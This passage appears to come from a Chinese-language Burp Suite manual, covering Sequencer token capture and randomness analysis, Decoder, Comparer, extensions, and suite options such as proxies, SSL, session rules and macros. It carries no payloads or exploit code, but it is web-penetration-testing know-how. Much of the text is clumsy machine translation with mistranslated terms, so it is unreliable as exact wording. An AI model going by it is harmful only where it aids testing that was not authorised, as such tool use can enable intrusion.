class="code"><pre><span class="line">number of threads(执行绪数目) - 此选项控制并发请求数的实时捕捉，却可以使。  </span><br><span class="line">Throttle between requests(请求之间的节流)- 可选的，实时捕捉每一个可以请求之前等待一个指定的延迟（以毫秒为单位）。此选项很有用，以避免超载应用程序，或者是更隐蔽。  </span><br><span class="line">Ignore token whose length deviates by x characters忽略令牌，其长度偏差的X字符- 您可以选择配置的实时捕捉忽略的令牌，其长度与平均长度令牌偏离给定的阈值。这可能是有用的，如果应用程序偶尔会返回一个包含在令牌通常出现的位置不同项目的异常反应。 </span><br></pre></td></tr></table></figure><h4 id="vi-Running-the-Live-Capture"><a href="#vi-Running-the-Live-Capture" class="headerlink" title="vi)Running the Live Capture"></a>vi)Running the Live Capture</h4><p>当你已经完全配置的live Capture(实时捕捉)，点击“开始实时捕获”按钮开始实时捕捉。burp序会反复发出您的请求，并从应用程序的响应提取相关的令牌。在实时捕捉，一个进度条显示，有令牌，请求和网络错误次数的计数器。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Pause/resume(暂停/恢复) - 这将暂时停顿，然后继续，捕捉。  </span><br><span class="line">Stop(停止) - 这会永久停止捕获。副本令牌 - 这会将当前拍摄的令牌到剪贴板，以便在其他burp攻击（如入侵者有效载荷）或工具的使用。  </span><br><span class="line">Save tokens(保存tokens) - 这节省了当前拍摄的令牌文件。  </span><br><span class="line">Auto-analyze(自动分析) - 如果启用此选项，burp就会自动进行标记分析，并定期更新结果现场采集过程中。  </span><br><span class="line">Analyze now(现在分析) - 这是时可用最少100令牌已被抓获，并导致burp，分析当前采样和更新的结果。</span><br></pre></td></tr></table></figure><h3 id="Manual-load"><a href="#Manual-load" class="headerlink" title="Manual load"></a>Manual load</h3><p>此功能允许你加载Sequencer与您已获得令牌的样本，然后进行统计分析的样本。</p><p>要执行手动负载，您首先需要通过一些手段，比如你自己的脚本或从较早的live captrue实时捕捉，输出，或Intruder attack，以获得自己的目标应用程序令牌的样本。令牌需要在一个简单的换行符分隔的文本格式。</p><p>使用粘贴按钮，从剪贴板粘贴，或Load按钮的标记，从文件中加载它们。加载令牌，再加上最短和最长长度的详细情况，将显示您感，检查样品已正确装入。<br>要执行加载令牌的分析，请单击“analyze now(立即分析）”按钮。</p><h3 id="Analysis-Options"><a href="#Analysis-Options" class="headerlink" title="Analysis Options"></a>Analysis Options</h3><p>在“analysis options(分析选项)”选项卡允许您配置如何Token Handled，并在分析过程中都进行哪些类型的测试。</p><h3 id="Token-handling"><a href="#Token-handling" class="headerlink" title="Token handling"></a>Token handling</h3><p>令牌过程中如何分析处理这些设置控制。下列选项可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Pad short tokens at start/end(垫短令牌在开始/结束) - 如果由应用程序产生的标记具有可变长度，这将需要被填充，以使将要进行的统计检验。您可以选择是否填充应在开始或每个标记的结尾被应用。在大多数情况下，填充令牌在开始是最合适的。  </span><br><span class="line">Pad with(垫) - 您可以指定将用于填充字符。在大多数情况下，对于数字或ASCII十六进制编码的令牌，填充与“0”字符是最合适的。  </span><br><span class="line">Base64-decode before analyzing(base64解码分析之前) - 如果令牌是Base64编码，可以配置Burp分析，这将普遍提高在编码分析之前的准确度。</span><br></pre></td></tr></table></figure><h3 id="Token-Analysis"><a href="#Token-Analysis" class="headerlink" title="Token Analysis"></a>Token Analysis</h3><p>这些选项控制所执行分析的类型。您可以单独启用或禁用每种类型的字符级和位级测试。有时候，启用所有测试进行了初步分析后，您可能需要禁用某些测试，以反映您更好的了解所标记的特点，或以隔离受您的样品表现任何不寻常的特性的影响。<br>在结果窗口中，修改任何的分析选项后，您可以点击“重做分析”按钮，您的新设置重新进行了分析，并更新结果。</p><h3 id="Result"><a href="#Result" class="headerlink" title="Result"></a>Result</h3><h3 id="Summary"><a href="#Summary" class="headerlink" title="Summary"></a>Summary</h3><p>summary选项卡是看获得有关随机性样品中的程度的总体结论首位。它包括一个图表，显示的有效熵以上各显着性水平的位的数目。这提供了一个直观的判决用来传递随机性测试不同的可能显着性水平的位的数目。<br>该标签还报告了结果的可靠性的估计值，是根据样本的数量。</p><h3 id="Character-level-analysis"><a href="#Character-level-analysis" class="headerlink" title="Character-level analysis"></a>Character-level analysis</h3><p>人物层次的分析选项卡显示所有字符级测试结果摘要，并让您深入到每个字符级测试的细节。它也包含图表显示的字符集在每个位置的大小，并且熵的比特可以从每个字符位置来提供的最大数量。</p><p>注意，字符级测试是不可靠的，如果所采用的字符集的大小过大相对于样本的数目。例如，如果一个令牌采用了64个不同的字符在每个位置，你只捕获100个样品，还有隔靴搔痒的样本数据得出关于角色分配的任何可靠的结论。出于这个原因，当存在的不可靠的结果的危险，burp序将自动禁止字符级测试，以防止破坏整体合并结果从分析的字符级的结果。</p><h3 id="Bit-level-analysis"><a href="#Bit-level-analysis" class="headerlink" title="Bit-level analysis"></a>Bit-level analysis</h3><p>该位层次的分析选项卡中显示了所有位级的测试结果摘要，并让您深入到每一个位级测试的细节。这可以让你获得样品的性能有更深的了解，找出任何异常的原因，并评估令牌预测的可能性。<br>还有一个图表，显示位贡献的令牌中的每一个字符的位置的数目。这将使你的令牌中交叉引用各个位回到原来的字符位置，如果你需要。</p><h3 id="Analysisi-options"><a href="#Analysisi-options" class="headerlink" title="Analysisi options"></a>Analysisi options</h3><p>分析选项卡显示已配置的分析的选项。如果需要重新进行分析,您可以修改这些。</p><h3 id="Decoder"><a href="#Decoder" class="headerlink" title="Decoder"></a>Decoder</h3><p>Burp Decoder是一种用于将编码数据纳入其规范形式，或将原始数据转换成各种编码和哈希表的简单工具。它能够智能地识别多种编码格式采用启发式技术。</p><h3 id="Loading-Raw-Data"><a href="#Loading-Raw-Data" class="headerlink" title="Loading Raw Data"></a>Loading Raw Data</h3><p>您可以将数据加载到解码器在两个方面：</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085128458.png" alt="Image017" title="image017.png"></p><p>键入或直接粘贴到顶部编辑器面板。</p><p>选择数据中burp的任何位置，然后从上下文菜单中选择“发送到解码器”。</p><p>您可以使用“文本”和“十六进制”按钮来切换编辑器的类型来对数据使用。</p><h3 id="Transformations"><a href="#Transformations" class="headerlink" title="Transformations"></a>Transformations</h3><p>转换不同的变换可以应用到的数据的不同部分。下面的解码和编码操作可用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">1)Url  </span><br><span class="line">2)HTMLBase64  </span><br><span class="line">3)十六进制  </span><br><span class="line">4)ASCII码  </span><br><span class="line">5)八进制  </span><br><span class="line">6）二进制  </span><br><span class="line">7)GZIP等 </span><br></pre></td></tr></table></figure><p>各种常用的散列函数是可用的，取决于你的Java平台的功能。</p><h3 id="Working-manually"><a href="#Working-manually" class="headerlink" title="Working manually"></a>Working manually</h3><p>要进行手动解码和编码，使用下拉列表选择所需的变革。所选择的转型将被应用到选定数据，或整个数据如果没有被选中。</p><h3 id="Smart-decoding"><a href="#Smart-decoding" class="headerlink" title="Smart decoding"></a>Smart decoding</h3><p>在解码器内的任何面板，您可以点击“智能解码”按钮。然后Burp将试图通过寻找出现在可识别的格式，例如URL编码或HTML编码要编码的数据来智能地解码该面板的内容。递归执行这个动作，一直持续到没有进一步的识别的数据格式检测。这个选项可以是一个有用的第一步，当你已经确定了一些不透明的数据，并想快速浏览一下，看看是否可以很容易地解码成更容易识别的形式。应用到数据的每个部分的解码是使用通常的着色表示。因为Burp解码器，使一个“最佳猜测”尝试识别一些常见的编码格式，它有时会犯错误。发生这种情况时，你可以很容易地看到所有参与解码的阶段，及已被应用在每个位置上的转变。使用手动控制则可以手动修复任何不正确的转换和手动或巧妙继续解码从这点。</p><h2 id="Comparer"><a href="#Comparer" class="headerlink" title="Comparer"></a>Comparer</h2><hr><p>Burp的Comparer是执行任何两项数据之间的比较（视觉“diff(差异)”）一个简单的工具。对Burp的Comparer一些常见用途如下：<br>当寻找的用户名枚举的条件下，您可以使用有效和无效的用户名比较响应登录失败，寻找在反应细微的差别。<br>当Intruder袭击已导致不同长度的比基反应一些非常大的反应，你可以比较这些很快看到那里的分歧所在。<br>当comparing的site maps或通过不同类型的用户生成的Proxy history条目，你可以比较对类似的要求，看看那里的不同之处在于，为不同的应用程序行为引起的。<br>当测试使用布尔条件注射和其他类似的测试盲目SQL注入漏洞，你可以比较两个反应，看是否注射不同的条件已导致响应的相关差异。</p><h3 id="Loading-Raw-Data-1"><a href="#Loading-Raw-Data-1" class="headerlink" title="Loading Raw Data"></a>Loading Raw Data</h3><p>您可以将数据加载到comparer对以下方式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">它直接粘贴形成剪贴板。  </span><br><span class="line">从文件中加载它。  </span><br><span class="line">选择数据中burp的任何位置，然后从上下文菜单中选择“发送到的Comparer”。</span><br></pre></td></tr></table></figure><h3 id="Performing-Comparisons"><a href="#Performing-Comparisons" class="headerlink" title="Performing Comparisons"></a>Performing Comparisons</h3><p>加载数据的每个项目显示为两个相同的列表。要进行比较，从每个列表中选择其他项目，并单击其中的“comparsions”按钮之一：</p><p>Word compare(字比较) - 这种比较tokenizes根据空格分隔每个数据项，并确定了改造的第一个项目进入第二所需的标记级别的编辑。当在单词层面存在被比较项之间的有趣的差异，例如，在含有不同含量的HTML文档，是最有用的。</p><p>Byte compare(字节比较) - 这种比较确定改造的第一个项目进入第二所需的字节级的编辑。当在字节水平存在比较项之间的有趣的差别，比如在包含在一个特定的参数或cookie值稍有不同值的HTTP请求，这是最有用的。注意：该字节级的比较是相当多的计算密集的，并且当一个字级别的比较失败，以确定在一个信息道的相关的差异通常应该只使用这个选项。当您启动一个比较，会出现一个新窗口，显示比较的结果。该窗口的标题栏显示的差异（即编辑）这两个项目之间的总数。在两个主面板显示项目相比彩色化来表示每个修改，删除和改造的第一个项目进入第二所需的加法。你可以在文本或十六进制形式查看每个项目。选择“sync views(同步视图)”选项可以使您同时滚动两个小组等快速找出在大多数情况下有趣的编辑。</p><h2 id="Extender"><a href="#Extender" class="headerlink" title="Extender"></a>Extender</h2><hr><h3 id="Using-Burp-extender"><a href="#Using-Burp-extender" class="headerlink" title="Using Burp extender"></a>Using Burp extender</h3><p>要使用Burp extender功能，需要一下几个步骤：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.首先必须要有java环境  </span><br><span class="line">2.在Burp extensions 下单击add添加</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712085121460.png" alt="Image019" title="image019.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">3.选择查找.jar后缀插件，点击确定之后下一步就是安装了  </span><br><span class="line">4.安装好了会提示安装成功，并且在如下图中显示</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712085125497.png" alt="Image021" title="image021.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">5.如果是python扩展的话需要先到options中配置好python环境并且安装jython环境</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712085147917.png" alt="Image023" title="image023.png"></p><h3 id="Loading-and-managing-extensions"><a href="#Loading-and-managing-extensions" class="headerlink" title="Loading and managing extensions"></a>Loading and managing extensions</h3><p>下表显示了所有已安装的扩展名列表。您可以添加，删除和使用按钮的扩展表重新排序的扩展。请注意：<br>该扩展名的显示顺序是，其中的任何注册的侦听器和其他推广资源将被调用的顺序。<br>扩展可以卸载，但保留在表中，以便能够方便重装稍后time.To切换扩展的负载状态，而不从列表中删除它，在“loaded”栏或扩展详细信息面板中单击该复选框。注意：您可以快速重新按Ctrl +单击“loaded”复选框的延伸。这将卸载并重新加载该扩展名，而不显示确认对话框。<br>要运行用Python编写的扩展，你首先需要配置Jython的独立JAR的位置，在Python环境选项。</p><h3 id="Extension-details"><a href="#Extension-details" class="headerlink" title="Extension details"></a>Extension details</h3><p>选择在扩展表中的项目显示在下部面板的扩展信息。详细信息选项卡显示以下信息：无论是扩展当前加载的。您可以点击复选框，加载或卸载选定的扩展。扩展名。扩展可以通过编程设置其显示在用户界面中自己喜欢的名字。您可以手动编辑，如果需要此名称。扩展（ Java或Python）的类型。从中加载该扩展名的文件。的方法，听众，并在由扩展使用其他资源的详细信息。输出选项卡包含扩展的标准输出流的细节，以及错误选项卡包含有关标准错误流相同的信息。为每个数据流，可以配置应用程序的输出是否应该被定向到系统控制台，或者保存到文件中，或者在UI中显示出来。请注意：写法基于UI的输出窗口有大小限制，不适合用于重型记录。扩展是负责指导他们的输出和错误消息，其中burp已经分配给他们正确的数据流，并通过扩展API的编程可用。扩展不遵守这个可以直接直接输出到系统控制台，无论在这里具体确定的设置。</p><h3 id="Burp-extender-apis"><a href="#Burp-extender-apis" class="headerlink" title="Burp extender apis"></a>Burp extender apis</h3><p>此选项卡包含可用于创建Burp extensions API的细节。该列表显示，可在Burpk运行版本的API。从列表中选择一个接口的名称，显示界面代码全部。<br>您还可以使用“save interface files(另存接口文件)”和“save javadoc(保存Javadoc文件)”按钮来保存这些文件的本地副本，用于开发扩展的时候。</p><h2 id="Options-1"><a href="#Options-1" class="headerlink" title="Options"></a>Options</h2><hr><h3 id="Settings"><a href="#Settings" class="headerlink" title="Settings"></a>Settings</h3><p>此设置控制启动时Burp是如何处理扩展。当Burp启动时，它会自动恢复可扩展的配置清单。如果选择此选项，Burp也将自动尝试重新加载列表中的该被装在其发生时Burp是关闭任何扩展。</p><h3 id="Java-Environment"><a href="#Java-Environment" class="headerlink" title="Java Environment"></a>Java Environment</h3><p>设置允许您配置环境执行的是用Java编写的扩展。如果您的扩展使用任何库，你可以指定哪些库将被加载的文件夹。burp会搜索这个文件夹中的任何JAR文件，并且将在用于加载Java扩展类加载器的类路径中包括这些。</p><h3 id="Python-Environment"><a href="#Python-Environment" class="headerlink" title="Python Environment"></a>Python Environment</h3><p>设置允许您配置环境执行的是用Python编写的扩展。使用Python扩展，您将需要下载的Jython ，这是Java实现的Python解释器。下列选项可用：在Jython的独立JAR文件的位置 - 这是您已下载的Jython的位置。你必须下载的Jython的独立版本。文件夹中加载的模块 - 此设置是可选的，可以用来指定从哪个Python解释器应该尝试加载所需要的您的扩展模块的文件夹。如果配置，此选项会导致Burp来更新指定的位置了Python的sys.path变量。如果您已经创建了自己的一套Python库在多个单独的扩展使用使用此选项很有用。</p><p>注意：由于在Jython中动态生成Java类的方式，您可能会遇到内存问题，如果你加载多个不同的Python扩展，或者如果你卸载并重装一个Python扩展多次。如果发生这种情况，你会看到一个这样的错误：java.lang.OutOfMemoryError: PermGen space<br>You can avoid this problem by configuring Java to allocate more PermGen storage, by adding a -XX:MaxPermSize option to the command line when starting Burp.</p><p>例如:java -XX:MaxPermSize&#x3D;1G -jar burp.jar</p><h2 id="Ruby-Environment"><a href="#Ruby-Environment" class="headerlink" title="Ruby Environment"></a>Ruby Environment</h2><p>设置允许您配置环境执行的是用Ruby编写的扩展。使用Ruby的扩展，你需要下载的JRuby，这是Java实现的Ruby解释器。请注意，您可以在这里配置JRuby的JAR文件的位置，或者您也可以通过Java类路径在启动时加载的JAR文件。</p><h2 id="Suite-Options"><a href="#Suite-Options" class="headerlink" title="Suite Options"></a>Suite Options</h2><hr><p>Burp含有大量的影响的所有工具的行为套房范围的选项。</p><p>有如下选项：</p><h3 id="Connections"><a href="#Connections" class="headerlink" title="Connections"></a>Connections</h3><p>此选项卡包含设置来控制Burp platform authentication，upstream proxy servers，SOCKS代理，timeouts，hostname resolution，以及范围外的要求。</p><h3 id="platform-authentication"><a href="#platform-authentication" class="headerlink" title="platform authentication"></a>platform authentication</h3><p>设置允许您配置Burp platform authentication(平台自动)验证到目标Web服务器。不同的认证方式和认证可以配置为单个主机。</p><p>支持的认证类型有：Basic(基本的)，NTLMv1，NTLMv2身份验证和摘要验证。域和主机名信息仅用于NTLM身份验证。</p><p>在“Prompt for credentials on platform authentication failure(提示平台上认证失败凭据)”选项会导致Burp显示交互式弹出每当身份验证失败时遇到的问题。</p><h3 id="Upstream-Proxy-Servers"><a href="#Upstream-Proxy-Servers" class="headerlink" title="Upstream Proxy Servers"></a>Upstream Proxy Servers</h3><p>设置控制Burp是否会向外发送请求到Upstream Proxy Servers，或者直接到目标Web服务器。<br>您可以定义多个规则，指定不同的目标主机或主机组不同的代理服务器设置。规则的应用顺序，而目标Web服务器相匹配的第一条规则将被使用。如果没有规则匹配，burp默认为直接的，非代理连接。<br>您可以在目标主机规范中使用通配符（*匹配零个或多个字符，而？除了点匹配任何字符）。将所有流量到一个单一的代理服务器，创建一个规则*为目的主机。离开代理主机空白直接连接到指定的主机。<br>对于您配置的每个上游代理服务器，如果需要，可以指定认证方式和认证。支持的认证类型有：基本的，NTLMv1，NTLMv2身份验证和摘要验证。域和主机名信息仅用于NTLM身份验证。</p><h3 id="Socks-Proxy"><a href="#Socks-Proxy" class="headerlink" title="Socks Proxy"></a>Socks Proxy</h3><p>设置允许您配置Burp使用SOCKS代理的所有传出的通信。此设置是应用在TCP层，所有出站请求都将通过这个代理发送。<br>如果您已经为上游HTTP代理服务器配置的规则，然后请求到上游代理服务器将通过这里配置的SOCKS代理发送。<br>如果“DNS查询在SOCKS代理”启用该选项，则所有的域名将由代理解决。没有本地查询将被执行。</p><h3 id="Timeouts"><a href="#Timeouts" class="headerlink" title="Timeouts"></a>Timeouts</h3><p>设置指定要用于各种网络任务的超时。您可以指定以下超时：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Normal(正常) - 此设置适用于大多数网络通信，并确定长期burp怎么会放弃已经发生了超时的请求，并记录之前等待。  </span><br><span class="line">Open-ended responses(开放式的回应) - 此设置仅用于需要响应不包含内容长度或传输编码的HTTP标头被处理的。在这种情况下，burp确定该传输已经完成之前，等待指定的时间间隔。  </span><br><span class="line">Domin name resoolution(域名解析) - 此设置确定如何经常burp会重新执行成功的域名查找窗口。这应该被设置为一个适当的低的值，如果目标主机地址被频繁地改变。  </span><br><span class="line">Failed domain name resolution(失败的域名解析) - 此设置确定burp多久将重新尝试不成功的域名查找窗口。  </span><br><span class="line">值以秒为单位。如果选项是空白的，然后burp永远不会超时的功能。  </span><br></pre></td></tr></table></figure><h3 id="Hostname-Resolution"><a href="#Hostname-Resolution" class="headerlink" title="Hostname Resolution"></a>Hostname Resolution</h3><p>设置使您可以指定主机名映射到IP地址，来覆盖你的电脑所提供的DNS解析。<br>每个主机名解析规则指定一个主机名，并应与该主机名关联的IP地址。规则可以单独启用或禁用。<br>这个功能可能是有用的，以确保请求的正确前进转发时，hosts文件已被修改为从非代理感知厚客户端组件进行流量的不可见的代理。</p><h3 id="Out-of-Scope-Request"><a href="#Out-of-Scope-Request" class="headerlink" title="Out-of-Scope Request"></a>Out-of-Scope Request</h3><p>可用于防止Burp从发行任何超出范围的要求。当你需要保证没有请求做出不在范围的为你目前的工作目标，它可以是有用的。即使你的浏览器使得对于超出范围的项目要求，即将卸任的请求将通过Burp被丢弃。<br>您可以启用此功能为当前目标范围。或者，您可以使用URL匹配规则定义自定义范围。</p><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2><hr><h3 id="Redirections"><a href="#Redirections" class="headerlink" title="Redirections"></a>Redirections</h3><p>设置控制重定向的类型的Burp会在它被配置为跟随重定向的情况下理解。<br>可以选择重定向的种类如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1)3xx status code with location header  </span><br><span class="line">2)refresh header  </span><br><span class="line">3)meta refresh tag  </span><br><span class="line">4)JavaScript driven  </span><br><span class="line">5)与Location标头的任何状态码 </span><br></pre></td></tr></table></figure><p>注意，Burp在以下重定向到特定的目标行为是由每个单独的Burp工具内设置（例如，根据目标范围内）来确定。</p><h3 id="Streaming-Responses"><a href="#Streaming-Responses" class="headerlink" title="Streaming Responses"></a>Streaming Responses</h3><p>可以告知Burp哪些URL返回“流媒体”的反应，这不终止。然后Burp会不同于正常的反应处理这些反应。流式反应通常用于像不断更新，现申请价格数据的功能。</p><h3 id="Status-100-Responses"><a href="#Status-100-Responses" class="headerlink" title="Status 100 Responses"></a>Status 100 Responses</h3><p>控制Burp处理与状态100的HTTP响应的方式。当一个POST请求发送到服务器，这些反应常发生的，它使一个临时的响应请求体已被发送之前。<br>下面的设置：<br>understand 100 continue response(了解100继续响应) - 如果选中此选项，Burp会跳过中期响应和解析真正的响应头像状态代码和内容类型的响应信息。<br>Remove 100 continue headers除去100继续头 - 如果选中此选项，Burp会在此之前被传递到单独的工具从服务器的响应中删除任何中期头部。</p><h3 id="SSL-Negotiation"><a href="#SSL-Negotiation" class="headerlink" title="SSL Negotiation"></a>SSL Negotiation</h3><p>有时候，你可能有困难的谈判与某些Web服务器的SSL连接。 Java的SSL协议栈包含了几个小鬼，和失败与某些不寻常的服务器配置工作。为了帮助您解决这个问题，Burp，您可以指定哪些协议和密码应该在SSL协商提供给服务器。下面的其他选项可用：自动选择对谈判失败兼容SSL参数 - 如果启用此选项，那么当Burp失败时使用配置的协议和密码进行谈判的SSL ，它会探测服务器，试图建立是由双方支持一组兼容的SSL参数服务器和Java 。如果找到兼容的参数，Burp缓存此信息，并使用在第一个实例中的参数具有相同的服务器未来的谈判。这个选项通常是可取的，可避免需要解决SSL问题，并尝试使用协议和密码。启用阻止Java安全策略的算法 - 从Java 7的， Java安全策略可以被用来从SSL协商被用于阻止某些过时的算法，以及其中的一些默认情况下（如MD2 ）受阻。现场许多Web服务器都使用这些过时的算法， SSL证书，它是不可能使用默认的Java安全策略来连接到这些服务器。启用此选项允许Burp在连接到受影响的服务器时使用过时的算法。对此选项的更改才会生效当您重新启动Burp。允许不安全的SSL重新协商 - 此选项可能会使用一些客户端的SSL证书时，或试图周围其他的SSL问题的工作是必要的。<br>SSL</p><h3 id="Client-SSL-Certificates"><a href="#Client-SSL-Certificates" class="headerlink" title="Client SSL Certificates"></a>Client SSL Certificates</h3><p>允许您配置客户端SSL证书，当目标主机申请一个Burp会使用。您可以配置多个证书，并指定每个证书应使用的主机。当主机请求的客户端SSL证书，Burp会在列表中的主机配置匹配被连接的主机的名称中使用的第一个证书。您可以在目标主机规范中使用通配符（ <em>匹配零个或多个字符，而？除了点匹配任何字符） 。要使用一个证书，每当任何主机请求之一，使用</em>作为目标主机。客户端证书支持以下类型：文件（ PKCS ＃ 12 ） - 你将需要配置的证书文件的位置和密码的证书。硬件令牌或智能卡（ PKCS ＃ 11 ） - 你将需要配置PKCS＃11库文件的位置，为您的设备，您的PIN码，然后选择从那些可用的证书。该PKCS＃11库文件是用软件为您的设备安装的本机代码文件。在Windows上，Burp可以自动搜索常见位置找到您所安装的库文件。</p><h3 id="Server-SSL-Certificates"><a href="#Server-SSL-Certificates" class="headerlink" title="Server SSL Certificates"></a>Server SSL Certificates</h3><p>此信息仅面板包含从Web服务器接收到的所有的X509证书的详细信息。双击表格中的项目，以显示该证书的完整细节。</p><h3 id="Session"><a href="#Session" class="headerlink" title="Session"></a>Session</h3><p>此选项卡包含的设置session handing rules,the cookie jar,and macros。</p><h3 id="Session-Handling-Challenges"><a href="#Session-Handling-Challenges" class="headerlink" title="Session Handling Challenges"></a>Session Handling Challenges</h3><p>当执行任何类型的Web应用程序的测试，你可能会遇到与会话处理和地区的挑战。<br>例如：该应用程序可终止被用于测试会话，无论是防守还是其他原因，使后续的请求是无效的，直到会话恢复。某些功能可能使用改变必须与每个请求（例如，妨碍请求伪造攻击）提供的令牌。某些功能可能需要一系列的要求被测试前，作出其他的请求，获取应用程序到一个合适的状态，它正在接受测试的要求。执行自动化测试任务，如起毛或扫描时，可能会出现这些问题，当你手动测试也可能出现。Burp的会话处理功能包含一系列的功能，以帮助在所有这些情况下，让你继续你的手动和自动测试，同时Burp需要在后台为你的问题的照顾。</p><h3 id="Session-Handling-Rules"><a href="#Session-Handling-Rules" class="headerlink" title="Session Handling Rules"></a>Session Handling Rules</h3><p>Burp让你定义的会话处理的规则清单，让您非常细粒度地控制Burp处理应用程序的会话处理机制和相关的功能。每个规则包含一个作用域（什么规则适用于）和行动（什么规则呢） 。对于每一个即将离任的要求，即Burp它决定了所定义的规则在范围的请求，并执行所有这些规则的行为的顺序（除非条件检查行动决定不采取进一步行动，应适用于要求提供） 。在范围内为每个规则可基于任何正在处理的请求的下列功能或全部来定义：<br>Burp工具发出的请求。<br>请求的URL。的请求中参数的名称。每个规则可以执行一个或多个动作，例如：更新cookie从Burp的蜜罐。验证当前会话。运行宏（请求的预定义的顺序） 。通过创建不同的范围和行动多条规则，你可以定义行为的层次结构Burp将适用于不同的应用和功能。例如，在一个特定的测试可以定义如下的规则：对于所有的请求，从Burp的cookie jar添加cookie。对于请求到特定的域，验证当前会话与该应用程序仍处于活动状态，如果没有，运行宏在应用程序重新登录，并更新蜜罐用得到的会话令牌。对于请求到包含__ csrftoken参数特定的URL ，首先运行一个宏来获取有效__ csrftoken价值，并提出请求时使用此。</p><h3 id="Session-Handling-Tracer"><a href="#Session-Handling-Tracer" class="headerlink" title="Session Handling Tracer"></a>Session Handling Tracer</h3><p>需要申请Burp的会话处理功能，以对现实世界的应用程序的功能的配置往往是复杂的，并且就很容易犯错。您可以使用会话处理示踪剂，以帮助您解决您的会话处理配置。<br>示踪显示，已经由会话处理功能的处理（即，其中至少一个会话规则已经应用）每个请求的列表。对于每个处理请求，所述示踪剂表示规则和进行该操作序列，并且改变到在序列中的每个步骤中的电流要求而作出。<br>请注意，会话处理示踪规定了所有受影响的HTTP请求的处理和存储开销。您应该只与故障排除会话处理的规则问题，当使用的示踪剂，不应该离开它通常运行。</p><h3 id="Cookie-Jar"><a href="#Cookie-Jar" class="headerlink" title="Cookie Jar"></a>Cookie Jar</h3><p>Burp维护一个cpploe干罐，用于存储所有你访问的网站发出的cookies 。密罐是所有Burp的工具之间共享。您可以配置哪些工具Cookie罐应监测，以更新的cookies 。默认情况下，蜜罐是基于代理和蜘蛛的工具流量更新。Burp监视由配置工具接收到的响应，并更新蜜罐与设置任何新的Cookie。在代理的情况下，从浏览器传入的请求也被检查。凡申请在前面设置一个永久性的Cookie这是目前在您的浏览器，这是需要你的会话进行适当的处理，这是很有用的。有Burp更新基础上，通过代理请求的蜜罐意味着所有必要的cookie将被添加到蜜罐，即使你的应用程序当前访问期间不更新该cookie的值。您还可以查看手工蜜罐和编辑的cookie的内容，使用“打开蜜罐”按钮。蜜罐可用于会话处理的规则和宏来自动更新从蜜罐曲奇传出请求。蜜罐荣誉Cookie的域范围，在模仿的cookie处理规格Internet Explorer的诠释方式。路径范围不兑现。</p><h3 id="Macros"><a href="#Macros" class="headerlink" title="Macros"></a>Macros</h3><p>macro是一个或多个请求一个预定义的顺序。您可以使用会话处理规则中的Macro来执行各种任务。典型用例的宏包括：获取该应用程序（如用户的主页）的页面来检查当前会话仍然有效。进行登录，以获得新的有效的会话。获得令牌或随机数作为另一个请求中的参数来使用。当Scanner或fuzz(模糊测试)在一个多步骤的过程的请求时，执行必要的前述要求，以获得应用到其中的目标请求将被接受的状态。在一个多步骤的过程中，“attack”的请求时，在完成该过程的剩余步骤，以确定所执行的动作，或者获得的结果，或者从该过程结束时的错误消息后。以及请求的基本序列，每个宏包含一些关于如何饼干和参数的序列中应处理的重要结构和单件之间的任何相关性。</p><h2 id="display"><a href="#display" class="headerlink" title="display"></a>display</h2><hr><h3 id="User-interface"><a href="#User-interface" class="headerlink" title="User interface"></a>User interface</h3><p>设置允许您控制Burp的用户界面的外观。您可以配置用于整个用户界面（除了HTTP消息的显示）的字体大小，也是Java的外观和感觉。更改这些设置就会生效时Burp重新启动。</p><h3 id="http-message-display"><a href="#http-message-display" class="headerlink" title="http message display"></a>http message display</h3><p>设置允许您控制HTTP消息会显示在原始的HTTP消息编辑器中。您可以设定字体和点大小和字体平滑是否被使用。您还可以配置为请求参数和响应语法语法彩色化是否完成。有很多小伙伴说乱码，就在这里设置。</p><p><img src="https://wooyun.js.org/images_result/images/2014101712085271093.png" alt="Image025" title="image025.png"></p><h3 id="Character-Sets"><a href="#Character-Sets" class="headerlink" title="Character Sets"></a>Character Sets</h3><p>设置控制Burp显示原始的HTTP消息时如何处理不同的字符集。可用的选项有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1)自动识别每个消息的字符集的基础上，邮件标题。这是默认选项，可让您同时在使用不同字符集的邮件的工作。  </span><br><span class="line">2)对所有消息使用平台默认的字符集。  </span><br><span class="line">3)显示消息的原始字节（使用ASCII编码），而不处理任何扩展字符。  </span><br><span class="line">4)对所有消息使用一个特定的字符集。</span><br></pre></td></tr></table></figure><p><img src="https://wooyun.js.org/images_result/images/2014101712085231193.png" alt="Image027" 